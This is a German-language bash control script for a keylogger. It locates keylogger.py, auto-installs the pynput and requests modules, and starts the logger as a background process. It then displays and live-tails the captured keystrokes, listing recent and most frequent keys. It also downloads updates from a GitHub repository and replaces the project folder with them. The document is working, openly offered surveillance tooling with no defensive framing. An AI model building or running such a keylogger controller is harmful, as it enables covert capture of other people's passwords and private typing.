#!/bin/bash
# keylogger-ctl.sh – Steuerung + Update-Check für den Keylogger
# Sucht keylogger.py in ~/Downloads (Fallback: ~/Scripts, ~/Desktop, ~/Documents)
# Prüft Python-Abhängigkeiten und installiert fehlende automatisch.

PIDFILE="/tmp/keylogger.pid"
OUTLOG="/tmp/keylogger.out.log"
ERRLOG="/tmp/keylogger.err.log"
LOG_DIR="$HOME/Documents/KeyLogs"

# Update-Konfiguration
GITHUB_REPO="lzwdev/Keylogger"
GITHUB_BRANCH="main"
ZIP_URL="https://github.com/${GITHUB_REPO}/archive/refs/heads/${GITHUB_BRANCH}.zip"
INFO_FILE="info.txt"
PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

REQUIRED_PY_MODULES=("requests" "pynput")

# ---------- Farben ----------
if [ -t 1 ]; then
    C_RESET=$'\033[0m'
    C_BOLD=$'\033[1m'
    C_DIM=$'\033[2m'
    C_RED=$'\033[31m'
    C_GREEN=$'\033[32m'
    C_YELLOW=$'\033[33m'
    C_BLUE=$'\033[34m'
    C_MAGENTA=$'\033[35m'
    C_CYAN=$'\033[36m'
    C_GRAY=$'\033[90m'
    C_WHITE=$'\033[97m'
else
    C_RESET=""; C_BOLD=""; C_DIM=""
    C_RED=""; C_GREEN=""; C_YELLOW=""; C_BLUE=""; C_MAGENTA=""; C_CYAN=""; C_GRAY=""; C_WHITE=""
fi

# ---------- Python-Skript finden ----------
find_py() {
    for cand in \
        "$HOME/Downloads/keylogger.py" \
        "$HOME/Scripts/keylogger.py" \
        "$HOME/Desktop/keylogger.py" \
        "$HOME/Downloads/Keylogger/keylogger.py" \
        "$HOME/Documents/Keylogger/keylogger.py" \
        "$HOME/Desktop/Keylogger/keylogger.py" \
        "$HOME/Documents/keylogger.py" \
        "$HOME/Keylogger/keylogger.py"
    do
        [ -f "$cand" ] && { echo "$cand"; return 0; }
    done
    return 1
}

PY=$(find_py)

if [ -n "$PY" ]; then
    PROJECT_DIR="$(dirname "$PY")"
fi

# ---------- Version / LastUpdate ----------
get_local_version() {
    local info="$PROJECT_DIR/$INFO_FILE"
    [ -f "$info" ] && grep -E '^version=' "$info" | cut -d'=' -f2 | tr -d '[:space:]'
}

get_local_lastupdate() {
    local info="$PROJECT_DIR/$INFO_FILE"
    [ -f "$info" ] && grep -E '^lastUpdate=' "$info" | cut -d'=' -f2- | tr -d '[:space:]'
}

get_remote_version() {
    local raw_url="https://raw.githubusercontent.com/${GITHUB_REPO}/${GITHUB_BRANCH}/${INFO_FILE}"
    curl -fsSL "$raw_url" 2>/dev/null | grep -E '^version=' | cut -d'=' -f2 | tr -d '[:space:]'
}

get_remote_lastupdate() {
    local raw_url="https://raw.githubusercontent.com/${GITHUB_REPO}/${GITHUB_BRANCH}/${INFO_FILE}"
    curl -fsSL "$raw_url" 2>/dev/null | grep -E '^lastUpdate=' | cut -d'=' -f2- | tr -d '[:space:]'
}

# ---------- ASCII-Hilfen ----------
BOX_W=58

# Zeile im Rahmen – Rahmen blau, Text bleibt wie übergeben
box_line() {
    local text="$1"
    local clean
    clean=$(printf "%s" "$text" | sed -E 's/\x1B\[[0-9;]*[mK]//g')
    local len=${#clean}
    local pad=$((BOX_W - len))
    [ "$pad" -lt 0 ] && pad=0
    printf "${C_BLUE}│${C_RESET} %s%*s ${C_BLUE}│${C_RESET}\n" "$text" "$pad" ""
}

# Trennlinie mit optionalem farbigem Label
box_sep() {
    local label="$1"
    if [ -z "$label" ]; then
        printf "${C_BLUE}├${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}┤${C_RESET}\n"
    else
        local clean
        clean=$(printf "%s" "$label" | sed -E 's/\x1B\[[0-9;]*[mK]//g')
        local len=${#clean}
        local left=2
        local right=$((BOX_W + 2 - left - len - 1))
        [ "$right" -lt 0 ] && right=0
        printf "${C_BLUE}├${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $left)
        printf " %s " "$label"
        printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $right); printf "${C_BLUE}┤${C_RESET}\n"
    fi
}

box_top()    { printf "${C_BLUE}╭${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╮${C_RESET}\n"; }
box_bottom() { printf "${C_BLUE}╰${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╯${C_RESET}\n"; }

# ---------- Update-Check ----------
check_update() {
    clear
    echo
    box_top
    box_line "${C_BOLD}${C_MAGENTA}UPDATE-CHECK${C_RESET}"
    box_line "${C_GRAY}Repository: ${GITHUB_REPO} (${GITHUB_BRANCH})${C_RESET}"
    box_sep ""

    local local_ver local_upd remote_ver remote_upd
    local_ver="$(get_local_version)"
    local_upd="$(get_local_lastupdate)"

    if [ -z "$local_ver" ]; then
        box_line "${C_RED}✗ Keine lokale info.txt gefunden${C_RESET}"
        box_line "${C_GRAY}  Pfad: $PROJECT_DIR/$INFO_FILE${C_RESET}"
        box_bottom
        echo
        return 1
    fi

    box_line "${C_CYAN}Lokal:${C_RESET}"
    box_line "  Version:     ${C_BOLD}${C_WHITE}${local_ver}${C_RESET}"
    box_line "  Last Update: ${C_GRAY}${local_upd:-unbekannt}${C_RESET}"
    box_sep ""

    box_line "${C_CYAN}Prüfe Remote …${C_RESET}"
    remote_ver="$(get_remote_version)"
    remote_upd="$(get_remote_lastupdate)"

    if [ -z "$remote_ver" ]; then
        box_line "${C_RED}✗ Remote-Version nicht lesbar${C_RESET}"
        box_line "${C_GRAY}  Prüfe Internet & info.txt im Repo${C_RESET}"
        box_bottom
        echo
        return 1
    fi

    box_line "${C_CYAN}Remote:${C_RESET}"
    box_line "  Version:     ${C_BOLD}${remote_ver}${C_RESET}"
    box_line "  Last Update: ${C_GRAY}${remote_upd:-unbekannt}${C_RESET}"
    box_sep ""

    if [ "$local_ver" = "$remote_ver" ]; then
        box_line "${C_GREEN}${C_BOLD}✓ Du bist auf dem neuesten Stand.${C_RESET}"
        box_line "${C_GREEN}  Version: ${local_ver}${C_RESET}"
        [ -n "$local_upd" ] && box_line "${C_GRAY}  Stand:   $local_upd${C_RESET}"
        box_bottom
        echo
        return 0
    fi

    box_line "${C_YELLOW}${C_BOLD}↑ Update verfügbar!${C_RESET}"
    box_line "  ${C_RED}${local_ver}${C_RESET}  ${C_YELLOW}→${C_RESET}  ${C_GREEN}${C_BOLD}${remote_ver}${C_RESET}"
    [ -n "$remote_upd" ] && box_line "${C_GRAY}  Neuer Stand: $remote_upd${C_RESET}"
    box_bottom
    echo

    read -rp "  ${C_YELLOW}Update jetzt installieren? [j/N]${C_RESET} " confirm
    case "$confirm" in
        j|J|y|Y) ;;
        *) echo "  ${C_GRAY}Abgebrochen.${C_RESET}"; return 0 ;;
    esac
    echo

    local tmp_dir
    tmp_dir="$(mktemp -d /tmp/keylogger-update.XXXXXX)" || { echo "${C_RED}[!] Temp-Ordner fehlgeschlagen.${C_RESET}"; return 1; }

    local zip_path="$tmp_dir/keylogger.zip"

    box_top
    box_line "${C_BOLD}${C_CYAN}DOWNLOAD${C_RESET}"
    box_sep ""

    local size_bytes
    size_bytes=$(curl -sIL "$ZIP_URL" 2>/dev/null | grep -i '^content-length:' | tail -1 | tr -dc '0-9')
    if [ -n "$size_bytes" ] && [ "$size_bytes" -gt 0 ] 2>/dev/null; then
        local size_human
        size_human=$(echo "$size_bytes" | awk '{printf "%.1f MB", $1/1024/1024}')
        box_line "Dateigröße: ${C_BOLD}${size_human}${C_RESET}"
    fi

    box_bottom
    echo

    if ! curl -fL --progress-bar -o "$zip_path" "$ZIP_URL"; then
        echo "${C_RED}[!] Download fehlgeschlagen.${C_RESET}"
        rm -rf "$tmp_dir"
        return 1
    fi
    echo

    echo "${C_CYAN}[i] Entpacke …${C_RESET}"
    if ! unzip -qo "$zip_path" -d "$tmp_dir"; then
        echo "${C_RED}[!] Entpacken fehlgeschlagen.${C_RESET}"
        rm -rf "$tmp_dir"
        return 1
    fi

    local extracted
    extracted=$(find "$tmp_dir" -maxdepth 1 -type d -name "Keylogger-*" | head -1)
    if [ -z "$extracted" ]; then
        echo "${C_RED}[!] Entpackter Ordner nicht gefunden.${C_RESET}"
        rm -rf "$tmp_dir"
        return 1
    fi

    local backup_dir="${PROJECT_DIR}.bak.$(date +%Y%m%d%H%M%S)"
    echo "${C_CYAN}[i] Ersetze Projektordner …${C_RESET}"

    if ! mv "$PROJECT_DIR" "$backup_dir"; then
        echo "${C_RED}[!] Konnte alten Ordner nicht verschieben.${C_RESET}"
        rm -rf "$tmp_dir"
        return 1
    fi

    if ! mv "$extracted" "$PROJECT_DIR"; then
        echo "${C_RED}[!] Konnte neuen Ordner nicht einsetzen. Stelle Backup wieder her …${C_RESET}"
        mv "$backup_dir" "$PROJECT_DIR"
        rm -rf "$tmp_dir"
        return 1
    fi

    rm -rf "$tmp_dir"

    echo
    box_top
    box_line "${C_GREEN}${C_BOLD}✓ UPDATE ERFOLGREICH${C_RESET}"
    box_sep ""
    box_line "  ${C_RED}${local_ver}${C_RESET}  ${C_GREEN}→${C_RESET}  ${C_GREEN}${C_BOLD}${remote_ver}${C_RESET}"
    [ -n "$remote_upd" ] && box_line "${C_GRAY}  Stand: $remote_upd${C_RESET}"
    box_sep ""
    box_line "${C_GRAY}Backup: ${backup_dir}${C_RESET}"
    box_line "${C_GRAY}  (kann gelöscht werden)${C_RESET}"
    box_sep ""
    box_line "${C_YELLOW}↻ Bitte Skript neu starten${C_RESET}"
    box_bottom
    echo
    return 0
}

# ---------- Python / Abhängigkeiten ----------
python_ok() {
    command -v python3 >/dev/null 2>&1
}

module_installed() {
    python3 - "$1" <<'PYEOF' >/dev/null 2>&1
import importlib, sys
try:
    importlib.import_module(sys.argv[1])
except Exception:
    sys.exit(1)
PYEOF
}

pip_available() {
    python3 -m pip --version >/dev/null 2>&1
}

ensure_dependencies() {
    if ! python_ok; then
        echo "${C_RED}[!] python3 nicht gefunden. Bitte installieren (z. B. via Homebrew: brew install python).${C_RESET}"
        return 1
    fi

    local missing=()
    for m in "${REQUIRED_PY_MODULES[@]}"; do
        if module_installed "$m"; then
            echo "${C_GREEN}  ✓${C_RESET} ${C_GRAY}vorhanden:${C_RESET} ${C_BOLD}$m${C_RESET}"
        else
            echo "${C_YELLOW}  !${C_RESET} ${C_GRAY}fehlt:${C_RESET}      ${C_BOLD}$m${C_RESET}"
            missing+=("$m")
        fi
    done

    if [ ${#missing[@]} -eq 0 ]; then
        echo "${C_GREEN}  ✓ Alle Abhängigkeiten vorhanden.${C_RESET}"
        return 0
    fi

    if ! pip_available; then
        echo "${C_RED}[!] pip nicht verfügbar. Bitte manuell installieren:${C_RESET}"
        echo "    ${C_CYAN}python3 -m ensurepip --upgrade${C_RESET}"
        return 1
    fi

    echo
    echo "${C_CYAN}[i]${C_RESET} Installiere fehlende Module: ${C_BOLD}${missing[*]}${C_RESET}"
    if python3 -m pip install --user "${missing[@]}"; then
        echo "${C_GREEN}[✓] Installation abgeschlossen.${C_RESET}"
    else
        echo "${C_RED}[!] Installation fehlgeschlagen.${C_RESET}"
        echo "    ${C_GRAY}Tipp: venv verwenden:${C_RESET}"
        echo "      ${C_CYAN}python3 -m venv ~/.venvs/keylogger${C_RESET}"
        echo "      ${C_CYAN}~/.venvs/keylogger/bin/pip install ${missing[*]}${C_RESET}"
        return 1
    fi

    local still_missing=()
    for m in "${missing[@]}"; do
        module_installed "$m" || still_missing+=("$m")
    done
    if [ ${#still_missing[@]} -gt 0 ]; then
        echo "${C_RED}[!] Weiterhin fehlend: ${still_missing[*]}${C_RESET}"
        echo "    ${C_GRAY}Tipp: pip aktualisieren: python3 -m pip install --upgrade pip${C_RESET}"
        return 1
    fi
    echo "${C_GREEN}[✓] Alle Abhängigkeiten vorhanden.${C_RESET}"
    return 0
}

# ---------- Prozess-Steuerung ----------
is_running() {
    [ -f "$PIDFILE" ] || return 1
    PID=$(cat "$PIDFILE" 2>/dev/null)
    [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null
}

status_line() {
    if is_running; then
        echo "${C_GREEN}● LÄUFT${C_RESET} ${C_GRAY}(PID $(cat "$PIDFILE"))${C_RESET}"
    else
        echo "${C_RED}○ GESTOPPT${C_RESET}"
    fi
}

start_kl() {
    if [ -z "$PY" ]; then
        echo "${C_RED}[!] keylogger.py nicht gefunden.${C_RESET}"
        echo "    ${C_GRAY}Erwartet in: ~/Downloads, ~/Scripts, ~/Desktop, ~/Documents${C_RESET}"
        return
    fi
    if is_running; then
        echo "${C_YELLOW}[i] Läuft bereits (PID $(cat "$PIDFILE")).${C_RESET}"
        return
    fi

    echo "${C_CYAN}[i]${C_RESET} Prüfe Python-Abhängigkeiten…"
    if ! ensure_dependencies; then
        echo "${C_RED}[!] Start abgebrochen – Abhängigkeiten unvollständig.${C_RESET}"
        return
    fi

    echo
    echo "${C_CYAN}[i]${C_RESET} Starte im Hintergrund…"
    nohup python3 "$PY" >"$OUTLOG" 2>"$ERRLOG" &
    echo $! > "$PIDFILE"
    sleep 1
    if is_running; then
        echo "${C_GREEN}[✓] Gestartet${C_RESET} ${C_GRAY}(PID $(cat "$PIDFILE"))${C_RESET}"
        echo "    ${C_GRAY}Skript: $PY${C_RESET}"
    else
        echo "${C_RED}[!] Start fehlgeschlagen. Siehe $ERRLOG:${C_RESET}"
        tail -n 5 "$ERRLOG" | sed "s/^/   ${C_RED}› ${C_RESET}/"
        rm -f "$PIDFILE"
    fi
}

# Stoppen: beendet den Prozess wirklich
stop_kl() {
    if ! is_running; then
        echo "${C_GRAY}[i] War nicht aktiv.${C_RESET}"
        rm -f "$PIDFILE"
        return
    fi

    local pid
    pid=$(cat "$PIDFILE")
    echo "${C_CYAN}[i]${C_RESET} Stoppe Prozess ${C_BOLD}PID $pid${C_RESET} …"

    kill "$pid" 2>/dev/null

    # Bis zu 3 Sekunden auf sauberes Beenden warten
    local waited=0
    while kill -0 "$pid" 2>/dev/null && [ "$waited" -lt 3 ]; do
        sleep 0.5
        waited=$((waited + 1))
    done

    if kill -0 "$pid" 2>/dev/null; then
        echo "${C_YELLOW}[!] Reagiert nicht – erzwinge Beenden …${C_RESET}"
        kill -9 "$pid" 2>/dev/null
        sleep 0.5
    fi

    rm -f "$PIDFILE"

    if kill -0 "$pid" 2>/dev/null; then
        echo "${C_RED}[!] Prozess konnte nicht beendet werden (PID $pid).${C_RESET}"
    else
        echo "${C_GREEN}[✓] Gestoppt (PID $pid).${C_RESET}"
    fi
}

show_status() {
    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
    echo " ${C_BOLD}${C_MAGENTA}STATUS${C_RESET}"
    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
    printf " %-13s %s\n" "Dienst:"      "$(status_line)"
    printf " %-13s %s\n" "Version:"     "${C_BOLD}$(get_local_version || echo 'unbekannt')${C_RESET}"
    printf " %-13s %s\n" "Last Update:" "${C_GRAY}$(get_local_lastupdate || echo 'unbekannt')${C_RESET}"
    printf " %-13s %s\n" "Skript:"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
    printf " %-13s %s\n" "Projekt:"     "${C_GRAY}$PROJECT_DIR${C_RESET}"
    printf " %-13s %s\n" "Logs:"        "${C_GRAY}$LOG_DIR${C_RESET}"
    if [ -s "$ERRLOG" ]; then
        echo
        echo " ${C_RED}Letzte Fehler:${C_RESET}"
        tail -n 3 "$ERRLOG" | sed "s/^/   ${C_RED}› ${C_RESET}/"
    fi
    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
    echo
}

show_history() {
    if [ ! -d "$LOG_DIR" ]; then
        echo "${C_RED}[!] Kein Log-Ordner: $LOG_DIR${C_RESET}"
        return
    fi
    LATEST=$(ls -t "$LOG_DIR"/keys_*.log 2>/dev/null | head -n1)
    if [ -z "$LATEST" ]; then
        echo "${C_YELLOW}[!] Noch keine Logdatei in $LOG_DIR${C_RESET}"
        return
    fi
    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
    echo " ${C_BOLD}${C_MAGENTA}TASTENDRÜCKE${C_RESET} ${C_GRAY}– $(basename "$LATEST")${C_RESET}"
    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"

    python3 - "$LATEST" <<'PYEOF'
import json, sys
from collections import Counter

path = sys.argv[1]
rows = []
with open(path, encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        try:
            rows.append(json.loads(line))
        except Exception:
            continue

presses = [r for r in rows if r.get("event") == "press"]
print(f" Gesamt: {len(rows)} Einträge | Tastendrücke: {len(presses)}")
print()
print(f"{'Zeit':<10} {'Taste':<20}")
print("-" * 32)
for r in presses[-40:]:
    key = r.get("key", "").replace("Key.", "").replace("'", "")
    print(f"{r.get('time',''):<10} {key:<20}")

print()
print(" Häufigste Tasten:")
for k, v in Counter(r.get("key","") for r in presses).most_common(10):
    k2 = k.replace("Key.", "").replace("'", "")
    print(f"   {k2:<20} {v}x")
PYEOF
    echo
    echo " ${C_GRAY}Datei: $LATEST${C_RESET}"
    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
    echo
}

follow_live() {
    if [ ! -d "$LOG_DIR" ]; then
        echo "${C_RED}[!] Kein Log-Ordner: $LOG_DIR${C_RESET}"
        return
    fi
    LATEST=$(ls -t "$LOG_DIR"/keys_*.log 2>/dev/null | head -n1)
    [ -z "$LATEST" ] && { echo "${C_YELLOW}[!] Keine Logdatei.${C_RESET}"; return; }
    echo "${C_CYAN}[i]${C_RESET} Live: ${C_GRAY}$LATEST${C_RESET}  ${C_GRAY}(Strg+C zum Beenden)${C_RESET}"
    tail -f "$LATEST"
}

# ---------- Menü ----------
while true; do
    clear
    echo
    echo "  ${C_BOLD}${C_MAGENTA}KeyLogger Steuerung${C_RESET}"
    echo "  ${C_BLUE}─────────────────────────────────────${C_RESET}"
    echo
    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Status"      "$(status_line)"
    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Version"     "${C_BOLD}$(get_local_version || echo 'unbekannt')${C_RESET}"
    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Last Update" "${C_GRAY}$(get_local_lastupdate || echo 'unbekannt')${C_RESET}"
    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Skript"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
    echo
    echo "  ${C_BLUE}─────────────────────────────────────${C_RESET}"
    echo
    echo "   ${C_GREEN}${C_BOLD}1${C_RESET}   Starten"
    echo "   ${C_RED}${C_BOLD}2${C_RESET}   Stoppen"
    echo "   ${C_CYAN}${C_BOLD}3${C_RESET}   Status"
    echo "   ${C_CYAN}${C_BOLD}4${C_RESET}   Verlauf (Übersicht)"
    echo "   ${C_CYAN}${C_BOLD}5${C_RESET}   Live-Verlauf"
    echo "   ${C_MAGENTA}${C_BOLD}6${C_RESET}   Abhängigkeiten prüfen"
    echo "   ${C_MAGENTA}${C_BOLD}7${C_RESET}   Nach Updates suchen"
    echo
    echo "   ${C_GRAY}${C_BOLD}q${C_RESET}   Beenden"
    echo
    echo "  ${C_BLUE}─────────────────────────────────────${C_RESET}"
    read -rp "   ${C_YELLOW}Auswahl:${C_RESET} " choice
    echo
    case "$choice" in
        1) start_kl;            read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
        2) stop_kl;             read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
        3) show_status;         read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
        4) show_history;        read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
        5) follow_live ;;
        6) ensure_dependencies; read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
        7) check_update;        read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
        q|Q) exit 0 ;;
        *) echo "   ${C_RED}[!] Ungültig.${C_RESET}"; sleep 1 ;;
    esac
done
